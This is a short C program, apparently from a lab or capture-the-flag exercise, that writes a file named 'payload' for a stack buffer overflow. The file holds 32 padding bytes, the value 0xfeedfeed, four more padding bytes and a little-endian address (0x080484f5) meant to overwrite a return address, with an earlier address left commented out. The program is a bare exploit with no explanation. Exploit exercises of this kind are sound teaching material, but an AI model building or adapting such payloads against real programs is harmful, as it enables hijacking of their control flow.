#include <stdlib.h>
#include <stdio.h>

int main() {
	
	FILE *out = fopen("payload", "w");

	int i;
	for(i = 0; i < 32; i++) {
		fprintf(out, "0");
	}
	fprintf(out, "%c", 0xed);
	fprintf(out, "%c", 0xfe);
	fprintf(out, "%c", 0xed);
	fprintf(out, "%c", 0xfe);

	for(i = 0; i < 4; i++){
		fprintf(out, "0");
	}
	//fprintf(out, "%c", 0xe0);
	//fprintf(out, "%c", 0x84);
	//fprintf(out, "%c", 0x04);
	//fprintf(out, "%c", 0x08);

	for(i = 0; i < 4; i++) {
		//fprintf(out, "0");
	}

	fprintf(out, "%c", 0xf5);
	fprintf(out, "%c", 0x84);
	fprintf(out, "%c", 0x04);
	fprintf(out, "%c", 0x08);

	fclose(out);	
	return 0;
}
